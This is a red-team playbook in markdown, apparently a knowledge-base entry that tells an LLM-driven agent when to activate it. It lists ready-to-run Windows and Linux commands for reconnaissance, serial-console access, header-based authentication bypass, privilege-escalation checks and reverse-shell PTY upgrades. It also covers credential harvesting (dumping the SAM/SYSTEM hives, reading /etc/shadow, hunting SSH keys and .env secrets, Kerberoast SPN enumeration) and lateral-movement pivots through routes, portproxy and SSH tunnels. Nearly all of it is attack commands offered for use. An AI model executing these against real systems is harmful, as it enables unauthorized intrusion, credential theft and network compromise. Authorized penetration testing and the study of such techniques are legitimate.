---
title: red_team_strategy_playbook
category: reasoning
engine: team_strategy_arbiter
team_role: red_team
os_platform: cross-platform
domain_hub: "[[knowledge/08_web_api_sql_injection_and_active_reconnaissance]]"
primary_tactic: Initial_Access_Exploitation
summary: "Red Team Offensive Strategy & Adversary Emulation Playbook: multi-layer reconnaissance (L1 Serial to L7 HTTP/API), OOB serial unlock, initial access, privilege escalation, credential harvesting, and cross-subnet routing/portproxy pivoting across Windows and Linux."
when_to_apply: "Apply when the operator or goal requires authorized offensive security, penetration testing, adversary emulation, target enumeration, out-of-band UART serial console unlock, web/API exploitation, privilege escalation, credential access, or lateral movement and cross-subnet routing pivots on Windows or Linux."
tags: [reasoning, red_team, red-team, offensive-security, adversary-emulation, pentest, reconnaissance, exploitation, privilege-escalation, credential-access, lateral-movement, pivoting, portproxy, tio, curl, nmap, windows, linux]
updated: 2026-10-30 23:43:00
---
# Red Team Strategy & Offensive Operations Playbook (`red_team_strategy_playbook`)

> **Team Role:** `RED_TEAM` (Authorized Offensive Operations, Exploitation & Lateral Pivoting)  
> **Primary H-MDP Tactics:** `Reconnaissance` $\to$ `Active_Enum` $\to$ `Out-of-Band_Access` $\to$ `Initial_Access_Exploitation` $\to$ `Privilege_Escalation` $\to$ `Credential_Access` $\to$ `Lateral_Movement_Routing_Pivot`  
> **Recommended Console Posture:** `RED` (Unrestricted Stack) or `BLUE` (Target Interface + USB Serial) | **Modes:** `Berserker` (Multi-Wave) / `Ninja` (Stealth) / `Standard`  
> **Backlinks:** [[00_MEMORY_INDEX]] | [[commands/windows_master_command_playbook]] | [[commands/linux_master_command_playbook]] | [[commands/curl_playbook]] | [[commands/tio_serial_playbook]] | [[knowledge/08_web_api_sql_injection_and_active_reconnaissance]] | [[knowledge/05_windows_and_linux_networking_routing_and_firewalls]]

---

## 1. When Engines & LLM Must Activate This Playbook
Activate `[[reasoning/red_team_strategy_playbook]]` whenever the query, goal, or system state involves:
- **Multi-Layer Target Discovery & Enumeration:** Mapping local interfaces, ARP neighbors, disjoint subnets, non-standard TCP/UDP ports, or TLS/HTTP API endpoints (`nmap`, `curl`, `Test-NetConnection`).
- **Out-of-Band (OOB) Hardware / Serial Appliance Unlock:** Accessing a target appliance via `/dev/ttyUSB0` / `COM` (`tio`) when L3/L4 network access is refused (`curl exit 7`) or filtered (`curl exit 28`).
- **Initial Access & Protocol Chaining:** Web/API authentication or header bypass (`X-Forwarded-For: 127.0.0.1`), SQL injection testing, mTLS certificate extraction, or service exploitation.
- **Privilege Escalation & Credential Access:** Enumerating misconfigured Windows services, unquoted paths, `SeImpersonatePrivilege`, `AlwaysInstallElevated`, Kerberos SPNs (`setspn`), SAM/SYSTEM hives, or Linux `sudo -l`, SUID binaries, Linux capabilities (`getcap`), and SSH keys.
- **Lateral Movement & Cross-Subnet Pivoting:** Injecting static routes (`ip route replace`, `route add`), enabling IPv4 forwarding + NAT masquerading, or creating TCP port proxies (`netsh interface portproxy`, `ssh -L/-D/-J`).

---

## 2. 15-Engine Neuro-Symbolic Alignment for Red Team Operations
| Engine Layer | Engine Name | Red Team Strategic Role & Decision Rule |
| :--- | :--- | :--- |
| **Layer 0** | **Engine 1 (`associative`) & Engine 9 (`temporal_fluents`)** | Ratchet monotonically across OSI prerequisite stages (`s_init_unknown` $\to$ `s_l2_l3_verified` $\to$ `s_active_services_enumerated` $\to$ `s_initial_shell_or_api_access` $\to$ `s_goal_verified_complete`). |
| **Layer 1** | **Engine 2 (`geometric`) & Engine 12 (`cegar_verifier`)** | Compute exact subnet containment (in-subnet L2 vs disjoint L3 gateway requirement) and verify every command via CEGAR (no interactive hangs, `--script-run once` on `tio`, `-c`/`-n` on `ping`, `--max-time` on `curl`). |
| **Layer 2** | **Engine 4 (`bayesian`), Engine 7 (`vsa`) & Engine 11 (`cbr_fingerprints`)** | Convert failure codes (`curl exit 7` refused $\to$ non-standard port/loopback bind; `curl exit 28` timeout $\to$ missing route/DROP firewall) into immediate high-EIG pivot probes. |
| **Layer 3/4** | **Engine 15 (`mdp_tactical`) & Engine 19 (`rl_network_policy`)** | Follow Pessimistic $Q_{\text{LCB}}(s_t, a)$ across the 7 RL Network Stages (`STAGE_0` through `STAGE_6`); pivot immediately when Optimal Stopping signals $V_{\text{pivot}} > V_{\text{continue}}$. |
| **Layer 5** | **Engine 16 (`continual_learner`) & Engine 17 (`meta_learner`)** | Update Dirichlet transition counts online after each command execution to reinforce successful exploit/pivot paths. |

---

## 3. Concise 5-Phase Red Team Operational Playbook (Windows & Linux)

### Phase 1: L1/L2/L3 Topology Mapping & Active Service Discovery (`Reconnaissance` / `Active_Enum`)
| Objective | Windows Command (`CMD` / `PowerShell`) | Linux Command (`Bash`) | Tactical Trigger |
| :--- | :--- | :--- | :--- |
| **Map Host NICs, Routes & L2 ARP Cache** | `ipconfig /all & route print -4 & arp -a` | `ip -4 -br addr show; ip route show; ip neigh show` | `STAGE_0_UNMAPPED_LOCAL_NET`: Always run first to identify local subnets, gateways, and live neighbors. |
| **No-Ping (`-Pn`) Multi-Port TCP Sweep** | `powershell -NoProfile -Command "22,80,443,445,3389,5000,8000,8080,8443,9000 \| ForEach-Object { Test-NetConnection -ComputerName <TARGET_IP> -Port $_ -WarningAction SilentlyContinue }"` | `nmap -Pn -sT -sV -p 22,80,443,445,3389,5000,6000,8000,8080,8443,9000 <TARGET_IP>` | `STAGE_4_BYPASS_ICMP_PORT_SCAN`: Target blocks ICMP or default port 80/443 is refused (`exit 7`). |
| **DNS Zone Transfer & SRV Record Recon** | `nslookup -type=any <DOMAIN> <DNS_IP>` | `dig axfr @<DNS_IP> <DOMAIN> && dig _ldap._tcp.dc._msdcs.<DOMAIN> SRV @<DNS_IP>` | Discover internal hosts, domain controllers, and hidden subdomains. |

### Phase 2: Out-of-Band Serial Unlock (`L1`) & Web/API Exploitation (`L7`) (`Out-of-Band_Access` / `Initial_Access_Exploitation`)
| Objective | Windows Command (`CMD` / `PowerShell`) | Linux Command (`Bash`) | Tactical Trigger |
| :--- | :--- | :--- | :--- |
| **OOB UART Serial Socket & Firewall Unlock** | `powershell -NoProfile -Command "Get-CimInstance Win32_SerialPort \| Select-Object DeviceID,Description"` | `tio -b 115200 --mute --script-run once --script 'write("id\r\nip -4 -br addr\r\nss -tulpn\r\niptables -L -n\r\n"); while read(4096, 500) > 0 do end; exit(0)' /dev/ttyUSB0` | `STAGE_2_OOB_SERIAL_UNLOCK`: Target is unreachable over TCP/IP but `/dev/ttyUSB0` or `COMx` is attached. |
| **HTTP Verb, Header Bypass & TLS Inspection** | `curl.exe -sS -k -i -X OPTIONS http://<TARGET_IP>:<PORT>/ -H "X-Forwarded-For: 127.0.0.1"` | `curl -sS -k -L -i --max-time 10 -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 127.0.0.1" http://<TARGET_IP>:<PORT>/` | `STAGE_5_L7_AUTH_OR_HEADER_BYPASS`: API returns `401`/`403` or restricts access to localhost proxy headers. |
| **Authenticated / mTLS API Verification** | `curl.exe -sS -k --cert client.crt --key client.key https://<TARGET_IP>:<PORT>/api/status` | `curl -sS -k --cert client.crt --key client.key https://<TARGET_IP>:<PORT>/api/status` | `STAGE_6_L7_SERVICE_GOAL_VERIFY`: Verify full L7 endpoint access using harvested tokens or client certs. |

### Phase 3: Local Privilege Escalation (`Privilege_Escalation`)
| Objective | Windows Command (`CMD` / `PowerShell`) | Linux Command (`Bash`) | Tactical Trigger |
| :--- | :--- | :--- | :--- |
| **Check Current Privileges & Sudo/Token Rights** | `whoami /all` | `id && sudo -l 2>/dev/null` | Identify `SeImpersonatePrivilege`, `SeDebugPrivilege`, or `NOPASSWD` sudo entries immediately after initial shell. |
| **Find SUID, Capabilities & Unquoted Services** | `wmic service get Name,DisplayName,PathName,StartMode \| findstr /i "Auto" \| findstr /i /v "C:\Windows\\"` | `find / -perm -4000 -type f 2>/dev/null && getcap -r / 2>/dev/null` | Locate hijacked service paths on Windows or GTFOBins SUID / `cap_setuid+ep` binaries on Linux. |
| **Check Weak Service ACLs & MSI Elevation** | `accesschk64.exe -uwcqv "Authenticated Users" * /accepteula & reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` | `find /etc/systemd/system /etc/cron* -writable 2>/dev/null` | Identify modifiable services/unit files or `AlwaysInstallElevated=1` registry keys. |
| **Upgrade to Interactive PTY Shell** | `powershell -NoProfile -ExecutionPolicy Bypass` | `python3 -c 'import pty; pty.spawn("/bin/bash")'` *(or)* `script -qc /bin/bash /dev/null` | Required before running interactive commands (`su`, `sudo`, `ssh`) over a raw reverse shell. |

### Phase 4: Credential & Secret Harvesting (`Credential_Access`)
| Objective | Windows Command (`CMD` / `PowerShell`) | Linux Command (`Bash`) | Tactical Trigger |
| :--- | :--- | :--- | :--- |
| **Harvest Stored Credentials, Keys & Tickets** | `cmdkey /list & klist & dir /s /b C:\*pass* C:\*.kdbx C:\*unattend.xml 2>nul` | `find / -name "id_rsa*" -o -name "id_ed25519*" -o -name "*.pem" -o -name ".env" 2>/dev/null` | Extract cached domain credentials, Kerberos tickets, unattended install files, SSH keys, or API `.env` secrets. |
| **AD SPN Discovery (Kerberoasting) & DC Enum** | `setspn -T * -Q */* & nltest /dclist:` | `grep -rnE "password\|secret\|token\|api_key" /etc /opt /var/www 2>/dev/null` | Enumerate service accounts with SPNs for offline hash cracking or cleartext config credentials. |
| **Offline Registry Hive Extraction (`Admin`)** | `reg save HKLM\SAM sam.hiv & reg save HKLM\SYSTEM sys.hiv & reg save HKLM\SECURITY sec.hiv` | `cat /etc/shadow 2>/dev/null` | Extract local password hashes and LSA secrets once administrative/root privileges are achieved. |

### Phase 5: Lateral Movement & Cross-Subnet Routing Pivots (`Lateral_Movement_Routing_Pivot`)
| Objective | Windows Command (`CMD` / `PowerShell`) | Linux Command (`Bash`) | Tactical Trigger |
| :--- | :--- | :--- | :--- |
| **Inject Cross-Subnet Static Route via Pivot** | `route add <REMOTE_SUBNET> mask 255.255.255.0 <PIVOT_GATEWAY_IP>` | `sudo ip route replace <REMOTE_SUBNET>/24 via <PIVOT_GATEWAY_IP>` | `STAGE_3_CROSS_SUBNET_L3_ROUTE`: Target subnet is disjoint from local L2 interfaces. |
| **Enable IP Forwarding & NAT / Port Proxy** | `netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=<LPORT> connectaddress=<TARGET_IP> connectport=<RPORT>` | `sudo sysctl -w net.ipv4.ip_forward=1 && sudo iptables -t nat -A POSTROUTING -o <EGRESS_IFACE> -j MASQUERADE` | Route traffic across segmented subnets or forward internal-only services (`127.0.0.1`) externally. |
| **Execute Remote Lateral Command / Tunnel** | `powershell -NoProfile -Command "Invoke-Command -ComputerName <TARGET_IP> -ScriptBlock { whoami; hostname }"` | `ssh -N -L 0.0.0.0:<LPORT>:<TARGET_IP>:<RPORT> <USER>@<PIVOT_IP>` *(or `-D 1080` SOCKS5)* | Pivot execution or tunnel L4/L7 traffic through an established foothold host. |
